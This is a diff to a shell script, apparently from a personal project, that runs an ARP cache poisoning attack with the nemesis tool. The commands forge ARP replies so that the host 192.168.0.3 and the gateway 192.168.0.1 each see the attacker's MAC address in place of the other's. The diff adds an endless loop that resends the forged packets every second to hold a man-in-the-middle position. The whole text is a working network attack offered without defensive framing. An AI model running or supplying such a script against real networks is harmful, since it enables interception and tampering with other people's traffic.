@@ -21,6 +21,8 @@
 # poisoning arp cache of 192.168.0.3 (b8:27:eb:65:5f:ca)
 # by pretending to have ip address 192.168.0.1
 
+poison()
+{
 sudo nemesis arp -v -r -d wlp3s0 \
   -S 192.168.0.1 -D 192.168.0.3 \
   -h 74:c6:3b:1c:cc:05 -m b8:27:eb:65:5f:ca \
@@ -38,3 +40,12 @@ sudo nemesis arp -v -r -d wlp3s0 \
   -S 192.168.0.3  -D 192.168.0.1 \
   -h 74:c6:3b:1c:cc:05 -m 50:6a:03:04:37:bf \
   -H 74:c6:3b:1c:cc:05 -M 50:6a:03:04:37:bf
+}
+
+while true
+do
+  poison
+  sleep 1
+done;
+
+
